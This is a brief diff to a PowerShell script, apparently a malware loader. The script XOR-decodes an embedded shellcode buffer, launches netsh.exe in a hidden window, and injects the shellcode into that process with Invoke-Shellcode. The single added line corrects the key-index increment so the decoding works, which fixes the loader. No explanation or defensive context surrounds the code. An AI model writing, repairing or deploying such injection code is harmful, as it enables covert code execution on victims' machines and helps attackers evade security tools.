@@ -493,6 +493,7 @@ for($i=0;$i -lt $sc.Length;$i++){
         $ki=0;
     }
     $sc[$i] = $sc[$i] -bxor $k[$ki];
+    $ki++;
 }
 $processid = (start-process -filepath "netsh.exe" -WindowStyle hidden -passthru).Id
 Invoke-Shellcode -Shellcode $sc -Force -ProcessId $processid
